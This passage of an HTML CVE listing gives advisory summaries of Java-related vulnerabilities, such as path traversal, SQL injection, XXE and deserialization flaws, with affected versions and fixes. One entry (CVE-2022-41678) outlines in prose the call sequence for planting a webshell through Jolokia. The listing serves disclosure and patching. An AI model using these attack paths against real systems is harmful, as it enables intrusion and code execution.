ServiceDesk Plus before 14004, ServiceDesk Plus MSP before 13001, SupportCenter Plus before 11026, and Vulnerability Manager Plus before 10.1.2220.18. Exploitation is only possible if SAML SSO has ever been configured for a product (for some products, exploitation requires that SAML SSO is currently active).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4773">CVE-2022-4773</a></td>
		<td valign="top">** UNSUPPORTED WHEN ASSIGNED ** A vulnerability classified as problematic was found in cloudsync. Affected by this vulnerability is the function getItem of the file src/main/java/cloudsync/connector/LocalFilesystemConnector.java. The manipulation leads to path traversal. It is possible to launch the attack on the local host. The name of the patch is 3ad796833398af257c28e0ebeade68518e0e612a. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-216919. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4772">CVE-2022-4772</a></td>
		<td valign="top">A vulnerability was found in Widoco and classified as critical. Affected by this issue is the function unZipIt of the file src/main/java/widoco/WidocoUtils.java. The manipulation leads to path traversal. It is possible to launch the attack on the local host. The name of the patch is f2279b76827f32190adfa9bd5229b7d5a147fa92. It is recommended to apply a patch to fix this issue. VDB-216914 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4727">CVE-2022-4727</a></td>
		<td valign="top">A vulnerability, which was classified as problematic, was found in OpenMRS Appointment Scheduling Module up to 1.16.x. This affects the function getNotes of the file api/src/main/java/org/openmrs/module/appointmentscheduling/AppointmentRequest.java of the component Notes Handler. The manipulation of the argument notes leads to cross site scripting. It is possible to initiate the attack remotely. Upgrading to version 1.17.0 is able to address this issue. The name of the patch is 2ccbe39c020809765de41eeb8ee4c70b5ec49cc8. It is recommended to upgrade the affected component. The identifier VDB-216741 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4725">CVE-2022-4725</a></td>
		<td valign="top">A vulnerability was found in AWS SDK 2.59.0. It has been rated as critical. This issue affects the function XpathUtils of the file aws-android-sdk-core/src/main/java/com/amazonaws/util/XpathUtils.java of the component XML Parser. The manipulation leads to server-side request forgery. Upgrading to version 2.59.1 is able to address this issue. The name of the patch is c3e6d69422e1f0c80fe53f2d757b8df97619af2b. It is recommended to upgrade the affected component. The identifier VDB-216737 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-46751">CVE-2022-46751</a></td>
		<td valign="top">Improper Restriction of XML External Entity Reference, XML Injection (aka Blind XPath Injection) vulnerability in Apache Software Foundation Apache Ivy.This issue affects any version of Apache Ivy prior to 2.5.2. When Apache Ivy prior to 2.5.2 parses XML files - either its own configuration, Ivy files or Apache Maven POMs - it will allow downloading external document type definitions and expand any entity references contained therein when used. This can be used to exfiltrate data, access resources only the machine running Ivy has access to or disturb the execution of Ivy in different ways. Starting with Ivy 2.5.2 DTD processing is disabled by default except when parsing Maven POMs where the default is to allow DTD processing but only to include a DTD snippet shipping with Ivy that is needed to deal with existing Maven POMs that are not valid XML files but are nevertheless accepted by Maven. Access can be be made more lenient via newly introduced system properties where needed. Users of Ivy prior to version 2.5.2 can use Java system properties to restrict processing of external DTDs, see the section about "JAXP Properties for External Access restrictions" inside Oracle's "Java API for XML Processing (JAXP) Security Guide".

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4641">CVE-2022-4641</a></td>
		<td valign="top">A vulnerability was found in pig-vector and classified as problematic. Affected by this issue is the function LogisticRegression of the file src/main/java/org/apache/mahout/pig/LogisticRegression.java. The manipulation leads to insecure temporary file. The attack needs to be approached locally. The name of the patch is 1e7bd9fab5401a2df18d2eabd802adcf0dcf1f15. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-216500.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-46337">CVE-2022-46337</a></td>
		<td valign="top">A cleverly devised username might bypass LDAP authentication checks. In LDAP-authenticated Derby installations, this could let an attacker fill up the disk by creating junk Derby databases. In LDAP-authenticated Derby installations, this could also allow the attacker to execute malware which was visible to and executable by the account which booted the Derby server. In LDAP-protected databases which weren't also protected by SQL GRANT/REVOKE authorization, this vulnerability could also let an attacker view and corrupt sensitive data and run sensitive database functions and procedures. Mitigation: Users should upgrade to Java 21 and Derby 10.17.1.0. Alternatively, users who wish to remain on older Java versions should build their own Derby distribution from one of the release families to which the fix was backported: 10.16, 10.15, and 10.14. Those are the releases which correspond, respectively, with Java LTS versions 17, 11, and 8.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-45932">CVE-2022-45932</a></td>
		<td valign="top">A SQL injection issue was discovered in AAA in OpenDaylight (ODL) before 0.16.5. The aaa-idm-store-h2/src/main/java/org/opendaylight/aaa/datastore/h2/RoleStore.java deleteRole function is affected when the API interface /auth/v1/roles/ is used.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-45931">CVE-2022-45931</a></td>
		<td valign="top">A SQL injection issue was discovered in AAA in OpenDaylight (ODL) before 0.16.5. The aaa-idm-store-h2/src/main/java/org/opendaylight/aaa/datastore/h2/UserStore.java deleteUser function is affected when the API interface /auth/v1/users/ is used.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-45930">CVE-2022-45930</a></td>
		<td valign="top">A SQL injection issue was discovered in AAA in OpenDaylight (ODL) before 0.16.5. The aaa-idm-store-h2/src/main/java/org/opendaylight/aaa/datastore/h2/DomainStore.java deleteDomain function is affected for the /auth/v1/domains/ API interface.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-45927">CVE-2022-45927</a></td>
		<td valign="top">An issue was discovered in OpenText Content Suite Platform 22.1 (16.2.19.1803). The Java application server can be used to bypass the authentication of the QDS endpoints of the Content Server. These endpoints can be used to create objects and execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4583">CVE-2022-4583</a></td>
		<td valign="top">A vulnerability was found in jLEMS. It has been declared as critical. Affected by this vulnerability is the function unpackJar of the file src/main/java/org/lemsml/jlems/io/util/JUtil.java. The manipulation leads to path traversal. The attack can be launched remotely. The name of the patch is 8c224637d7d561076364a9e3c2c375daeaf463dc. It is recommended to apply a patch to fix this issue. The identifier VDB-216169 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4560">CVE-2022-4560</a></td>
		<td valign="top">A vulnerability was found in Joget up to 7.0.31. It has been rated as problematic. This issue affects the function getInternalJsCssLib of the file wflow-core/src/main/java/org/joget/plugin/enterprise/UniversalTheme.java of the component wflow-core. The manipulation of the argument key leads to cross site scripting. The attack may be initiated remotely. Upgrading to version 7.0.32 is able to address this issue. The name of the patch is ecf8be8f6f0cb725c18536ddc726d42a11bdaa1b. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-215963.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-45461">CVE-2022-45461</a></td>
		<td valign="top">The Java Admin Console in Veritas NetBackup through 10.1 and related Veritas products on Linux and UNIX allows authenticated non-root users (that have been explicitly added to the auth.conf file) to execute arbitrary commands as root.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-45146">CVE-2022-45146</a></td>
		<td valign="top">An issue was discovered in the FIPS Java API of Bouncy Castle BC-FJA before 1.0.2.4. Changes to the JVM garbage collector in Java 13 and later trigger an issue in the BC-FJA FIPS modules where it is possible for temporary keys used by the module to be zeroed out while still in use by the module, resulting in errors or potential information loss. NOTE: FIPS compliant users are unaffected because the FIPS certification is only for Java 7, 8, and 11.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-45047">CVE-2022-45047</a></td>
		<td valign="top">Class org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider in Apache MINA SSHD &lt;= 2.9.1 uses Java deserialization to load a serialized java.security.PrivateKey. The class is one of several implementations that an implementor using Apache MINA SSHD can choose for loading the host keys of an SSH server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4494">CVE-2022-4494</a></td>
		<td valign="top">A vulnerability, which was classified as critical, has been found in bspkrs MCPMappingViewer. Affected by this issue is the function extractZip of the file src/main/java/bspkrs/mmv/RemoteZipHandler.java of the component ZIP File Handler. The manipulation leads to path traversal. The attack may be launched remotely. The name of the patch is 6e602746c96b4756c271d080dae7d22ad804a1bd. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-215804.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4493">CVE-2022-4493</a></td>
		<td valign="top">A vulnerability classified as critical was found in scifio. Affected by this vulnerability is the function downloadAndUnpackResource of the file src/test/java/io/scif/util/DefaultSampleFilesService.java of the component ZIP File Handler. The manipulation leads to path traversal. The attack can be launched remotely. The name of the patch is fcb0dbca0ec72b22fe0c9ddc8abc9cb188a0ff31. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-215803.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4454">CVE-2022-4454</a></td>
		<td valign="top">A vulnerability, which was classified as critical, has been found in m0ver bible-online. Affected by this issue is the function query of the file src/main/java/custom/application/search.java of the component Search Handler. The manipulation leads to sql injection. The name of the patch is 6ef0aabfb2d4ccd53fcaa9707781303af357410e. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-215444.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-43928">CVE-2022-43928</a></td>
		<td valign="top">The IBM Toolbox for Java (Db2 Mirror for i 7.4 and 7.5) could allow a user to obtain sensitive information, caused by utilizing a Java string for processing. Since Java strings are immutable, their contents exist in memory until garbage collected. This means sensitive data could be visible in memory over an indefinite amount of time. IBM has addressed this issue by reducing the amount of time the sensitive data is visible in memory. IBM X-Force ID: 241675.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-43766">CVE-2022-43766</a></td>
		<td valign="top">Apache IoTDB version 0.12.2 to 0.12.6, 0.13.0 to 0.13.2 are vulnerable to a Denial of Service attack when accepting untrusted patterns for REGEXP queries with Java 8. Users should upgrade to 0.13.3 which addresses this issue or use a later version of Java to avoid it.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-43754">CVE-2022-43754</a></td>
		<td valign="top">An Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in spacewalk/Uyuni of SUSE Linux Enterprise Module for SUSE Manager Server 4.2, SUSE Linux Enterprise Module for SUSE Manager Server 4.3, SUSE Manager Server 4.2 allows remote attackers to embed Javascript code via /rhn/audit/scap/Search.do This issue affects: SUSE Linux Enterprise Module for SUSE Manager Server 4.2 hub-xmlrpc-api-0.7-150300.3.9.2, inter-server-sync-0.2.4-150300.8.25.2, locale-formula-0.3-150300.3.3.2, py27-compat-salt-3000.3-150300.7.7.26.2, python-urlgrabber-3.10.2.1py2_3-150300.3.3.2, spacecmd-4.2.20-150300.4.30.2, spacewalk-backend-4.2.25-150300.4.32.4, spacewalk-client-tools-4.2.21-150300.4.27.3, spacewalk-java-4.2.43-150300.3.48.2, spacewalk-utils-4.2.18-150300.3.21.2, spacewalk-web-4.2.30-150300.3.30.3, susemanager-4.2.38-150300.3.44.3, susemanager-doc-indexes-4.2-150300.12.36.3, susemanager-docs_en-4.2-150300.12.36.2, susemanager-schema-4.2.25-150300.3.30.3, susemanager-sls versions prior to 4.2.28. SUSE Linux Enterprise Module for SUSE Manager Server 4.3 spacewalk-java versions prior to 4.3.39. SUSE Manager Server 4.2 release-notes-susemanager versions prior to 4.2.10.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-43753">CVE-2022-43753</a></td>
		<td valign="top">A Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in spacewalk/Uyuni of SUSE Linux Enterprise Module for SUSE Manager Server 4.2, SUSE Linux Enterprise Module for SUSE Manager Server 4.3, SUSE Manager Server 4.2 allows remote attackers to read files available to the user running the process, typically tomcat. This issue affects: SUSE Linux Enterprise Module for SUSE Manager Server 4.2 hub-xmlrpc-api-0.7-150300.3.9.2, inter-server-sync-0.2.4-150300.8.25.2, locale-formula-0.3-150300.3.3.2, py27-compat-salt-3000.3-150300.7.7.26.2, python-urlgrabber-3.10.2.1py2_3-150300.3.3.2, spacecmd-4.2.20-150300.4.30.2, spacewalk-backend-4.2.25-150300.4.32.4, spacewalk-client-tools-4.2.21-150300.4.27.3, spacewalk-java-4.2.43-150300.3.48.2, spacewalk-utils-4.2.18-150300.3.21.2, spacewalk-web-4.2.30-150300.3.30.3, susemanager-4.2.38-150300.3.44.3, susemanager-doc-indexes-4.2-150300.12.36.3, susemanager-docs_en-4.2-150300.12.36.2, susemanager-schema-4.2.25-150300.3.30.3, susemanager-sls versions prior to 4.2.28. SUSE Linux Enterprise Module for SUSE Manager Server 4.3 spacewalk-java versions prior to 4.3.39. SUSE Manager Server 4.2 release-notes-susemanager versions prior to 4.2.10.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-43484">CVE-2022-43484</a></td>
		<td valign="top">TERASOLUNA Global Framework 1.0.0 (Public review version) and TERASOLUNA Server Framework for Java (Rich) 2.0.0.2 to 2.0.5.1 are vulnerable to a ClassLoader manipulation vulnerability due to using the old version of Spring Framework which contains the vulnerability.The vulnerability is caused by an improper input validation issue in the binding mechanism of Spring MVC. By the application processing a specially crafted file, arbitrary code may be executed with the privileges of the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-43428">CVE-2022-43428</a></td>
		<td valign="top">Jenkins Compuware Topaz for Total Test Plugin 2.4.8 and earlier implements an agent/controller message that does not limit where it can be executed, allowing attackers able to control agent processes to obtain the values of Java system properties from the Jenkins controller process.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-43424">CVE-2022-43424</a></td>
		<td valign="top">Jenkins Compuware Xpediter Code Coverage Plugin 1.0.7 and earlier implements an agent/controller message that does not limit where it can be executed, allowing attackers able to control agent processes to obtain the values of Java system properties from the Jenkins controller process.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-43423">CVE-2022-43423</a></td>
		<td valign="top">Jenkins Compuware Source Code Download for Endevor, PDS, and ISPW Plugin 2.0.12 and earlier implements an agent/controller message that does not limit where it can be executed, allowing attackers able to control agent processes to obtain the values of Java system properties from the Jenkins controller process.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-43422">CVE-2022-43422</a></td>
		<td valign="top">Jenkins Compuware Topaz Utilities Plugin 1.0.8 and earlier implements an agent/controller message that does not limit where it can be executed, allowing attackers able to control agent processes to obtain the values of Java system properties from the Jenkins controller process.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-42890">CVE-2022-42890</a></td>
		<td valign="top">A vulnerability in Batik of Apache XML Graphics allows an attacker to run Java code from untrusted SVG via JavaScript. This issue affects Apache XML Graphics prior to 1.16. Users are recommended to upgrade to version 1.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-42468">CVE-2022-42468</a></td>
		<td valign="top">Apache Flume versions 1.4.0 through 1.10.1 are vulnerable to a remote code execution (RCE) attack when a configuration uses a JMS Source with an unsafe providerURL. This issue is fixed by limiting JNDI to allow only the use of the java protocol or no protocol.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-41967">CVE-2022-41967</a></td>
		<td valign="top">Dragonfly is a Java runtime dependency management library. Dragonfly v0.3.0-SNAPSHOT does not configure DocumentBuilderFactory to prevent XML external entity (XXE) attacks. This issue is patched in 0.3.1-SNAPSHOT. As a workaround, since Dragonfly only parses XML `SNAPSHOT` versions are being resolved, this vulnerability may be avoided by not trying to resolve `SNAPSHOT` versions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-41966">CVE-2022-41966</a></td>
		<td valign="top">XStream serializes Java objects to XML and back again. Versions prior to 1.4.20 may allow a remote attacker to terminate the application with a stack overflow error, resulting in a denial of service only via manipulation the processed input stream. The attack uses the hash code implementation for collections and maps to force recursive hash calculation causing a stack overflow. This issue is patched in version 1.4.20 which handles the stack overflow and raises an InputManipulationException instead. A potential workaround for users who only use HashMap or HashSet and whose XML refers these only as default map or set, is to change the default implementation of java.util.Map and java.util per the code example in the referenced advisory. However, this implies that your application does not care about the implementation of the map and all elements are comparable.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-41946">CVE-2022-41946</a></td>
		<td valign="top">pgjdbc is an open source postgresql JDBC Driver. In affected versions a prepared statement using either `PreparedStatement.setText(int, InputStream)` or `PreparedStatemet.setBytea(int, InputStream)` will create a temporary file if the InputStream is larger than 2k. This will create a temporary file which is readable by other users on Unix like systems, but not MacOS. On Unix like systems, the system's temporary directory is shared between all users on that system. Because of this, when files and directories are written into this directory they are, by default, readable by other users on that same system. This vulnerability does not allow other users to overwrite the contents of these directories or files. This is purely an information disclosure vulnerability. Because certain JDK file system APIs were only added in JDK 1.7, this this fix is dependent upon the version of the JDK you are using. Java 1.7 and higher users: this vulnerability is fixed in 4.5.0. Java 1.6 and lower users: no patch is available. If you are unable to patch, or are stuck running on Java 1.6, specifying the java.io.tmpdir system environment variable to a directory that is exclusively owned by the executing user will mitigate this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-41917">CVE-2022-41917</a></td>
		<td valign="top">OpenSearch is a community-driven, open source fork of Elasticsearch and Kibana. OpenSearch allows users to specify a local file when defining text analyzers to process data for text analysis. An issue in the implementation of this feature allows certain specially crafted queries to return a response containing the first line of text from arbitrary files. The list of potentially impacted files is limited to text files with read permissions allowed in the Java Security Manager policy configuration. OpenSearch version 1.3.7 and 2.4.0 contain a fix for this issue. Users are advised to upgrade. There are no known workarounds for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-41853">CVE-2022-41853</a></td>
		<td valign="top">Those using java.sql.Statement or java.sql.PreparedStatement in hsqldb (HyperSQL DataBase) to process untrusted input may be vulnerable to a remote code execution attack. By default it is allowed to call any static method of any Java class in the classpath resulting in code execution. The issue can be prevented by updating to 2.7.1 or by setting the system property "hsqldb.method_class_names" to classes which are allowed to be called. For example, System.setProperty("hsqldb.method_class_names", "abc") or Java argument -Dhsqldb.method_class_names="abc" can be used. From version 2.7.1 all classes by default are not accessible except those in java.lang.Math and need to be manually enabled.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-41704">CVE-2022-41704</a></td>
		<td valign="top">A vulnerability in Batik of Apache XML Graphics allows an attacker to run untrusted Java code from an SVG. This issue affects Apache XML Graphics prior to 1.16. It is recommended to update to version 1.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-41678">CVE-2022-41678</a></td>
		<td valign="top">Once an user is authenticated on Jolokia, he can potentially trigger arbitrary code execution. In details, in ActiveMQ configurations, jetty allows org.jolokia.http.AgentServlet to handler request to /api/jolokia org.jolokia.http.HttpRequestHandler#handlePostRequest is able to create JmxRequest through JSONObject. And calls to org.jolokia.http.HttpRequestHandler#executeRequest. Into deeper calling stacks, org.jolokia.handler.ExecHandler#doHandleRequest can be invoked through refection. This could lead to RCE through via various mbeans. One example is unrestricted deserialization in jdk.management.jfr.FlightRecorderMXBeanImpl which exists on Java version above 11. 1 Call newRecording. 2 Call setConfiguration. And a webshell data hides in it. 3 Call startRecording. 4 Call copyTo method. The webshell will be written to a .jsp file. The mitigation is to restrict (by default) the actions authorized on Jolokia, or disable Jolokia. A more restrictive Jolokia configuration has been defined in default ActiveMQ distribution. We encourage users to upgrade to ActiveMQ distributions version including updated Jolokia configuration: 5.16.6, 5.17.4, 5.18.0, 6.0.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-41262">CVE-2022-41262</a></td>
		<td valign="top">Due to insufficient input validation, SAP NetWeaver AS Java (HTTP Provider Service) - version 7.50, allows an unauthenticated attacker to inject a script into a web request header. On successful exploitation, an attacker can view or modify information causing a limited impact on the confidentiality and integrity of the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4065">CVE-2022-4065</a></td>
		<td valign="top">A vulnerability was found in cbeust testng 7.5.0/7.6.0/7.6.1/7.7.0. It has been declared as critical. Affected by this vulnerability is the function testngXmlExistsInJar of the file testng-core/src/main/java/org/testng/JarFileUtils.java of the component XML File Parser. The manipulation leads to path traversal. The attack can be launched remotely. Upgrading to version 7.5.1 and 7.7.1 is able to address this issue. The patch is named 9150736cd2c123a6a3b60e6193630859f9f0422b. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-214027.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-40609">CVE-2022-40609</a></td>
		<td valign="top">IBM SDK, Java Technology Edition 7.1.5.18 and 8.0.8.0 could allow a remote attacker to execute arbitrary code on the system, caused by an unsafe deserialization flaw. By sending specially-crafted data, an attacker could exploit this vulnerability to execute arbitrary code on the system. IBM X-Force ID: 236069.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-3969">CVE-2022-3969</a></td>
		<td valign="top">A vulnerability was found in OpenKM up to 6.3.11 and classified as problematic. Affected by this issue is the function getFileExtension of the file src/main/java/com/openkm/util/FileUtils.java. The manipulation leads to insecure temporary file. Upgrading to version 6.3.12 is able to address this issue. The name of the patch is c069e4d73ab8864345c25119d8459495f45453e1. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-213548.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39429">CVE-2022-39429</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 19c and 21c. Easily exploitable vulnerability allows low privileged attacker having Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java VM. CVSS 3.1 Base Score 4.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39419">CVE-2022-39419</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 19c and 21c. Easily exploitable vulnerability allows low privileged attacker having Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java VM accessible data. CVSS 3.1 Base Score 4.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39399">CVE-2022-39399</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking). Supported versions that are affected are Oracle Java SE: 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39368">CVE-2022-39368</a></td>
		<td valign="top">Eclipse Californium is a Java implementation of RFC7252 - Constrained Application Protocol for IoT Cloud services. In versions prior to 3.7.0, and 2.7.4, Californium is vulnerable to a Denial of Service. Failing handshakes don't cleanup counters for throttling, causing the threshold to be reached without being released again. This results in permanently dropping records. The issue was reported for certificate based handshakes, but may also affect PSK based handshakes. It generally affects client and server as well. This issue is patched in version 3.7.0 and 2.7.4. There are no known workarounds. main: commit 726bac57659410da463dcf404b3e79a7312ac0b9 2.7.x: commit 5648a0c27c2c2667c98419254557a14bac2b1f3f

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39366">CVE-2022-39366</a></td>
		<td valign="top">DataHub is an open-source metadata platform. Prior to version 0.8.45, the `StatelessTokenService` of the DataHub metadata service (GMS) does not verify the signature of JWT tokens. This allows an attacker to connect to DataHub instances as any user if Metadata Service authentication is enabled. This vulnerability occurs because the `StatelessTokenService` of the Metadata service uses the `parse` method of `io.jsonwebtoken.JwtParser`, which does not perform a verification of the cryptographic token signature. This means that JWTs are accepted regardless of the used algorithm. This issue may lead to an authentication bypass. Version 0.8.45 contains a patch for the issue. There are no known workarounds.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39312">CVE-2022-39312</a></td>
		<td valign="top">Dataease is an open source data visualization analysis tool. Dataease prior to 1.15.2 has a deserialization vulnerability. In Dataease, the Mysql data source in the data source function can customize the JDBC connection parameters and the Mysql server target to be connected. In `backend/src/main/java/io/dataease/provider/datasource/JdbcProvider.java`, the `MysqlConfiguration` class does not filter any parameters. If an attacker adds some parameters to a JDBC url and connects to a malicious mysql server, the attacker can trigger the mysql jdbc deserialization vulnerability. Through the deserialization vulnerability, the attacker can execute system commands and obtain server privileges. Version 1.15.2 contains a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39311">CVE-2022-39311</a></td>
		<td valign="top">GoCD is a continuous delivery server. GoCD helps you automate and streamline the build-test-release cycle for continuous delivery of your product. GoCD versions prior to 21.1.0 are vulnerable to remote code execution on the server from a malicious or compromised agent. The Spring RemoteInvocation endpoint exposed agent communication and allowed deserialization of arbitrary java objects, as well as subsequent remote code execution. Exploitation requires agent-level authentication, thus an attacker would need to either compromise an existing agent, its network communication or register a new agent to practically exploit this vulnerability. This issue is fixed in GoCD version 21.1.0. There are currently no known workarounds.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39295">CVE-2022-39295</a></td>
		<td valign="top">Knowage is an open source suite for modern business analytics alternative over big data systems. KnowageLabs / Knowage-Server starting with the 6.x branch and prior to versions 7.4.22, 8.0.9, and 8.1.0 is vulnerable to cross-site scripting because the `XSSRequestWrapper::stripXSS` method can be bypassed. Versions 7.4.22, 8.0.9, and 8.1.0 contain patches for this issue. There are no known workarounds.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39259">CVE-2022-39259</a></td>
		<td valign="top">jadx is a set of command line and GUI tools for producing Java source code from Android Dex and Apk files. versions prior to 1.4.5 are subject to a Denial of Service when opening zip files with HTML sequences. This issue has been patched in version 1.4.5. There are no known workarounds.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-39243">CVE-2022-39243</a></td>
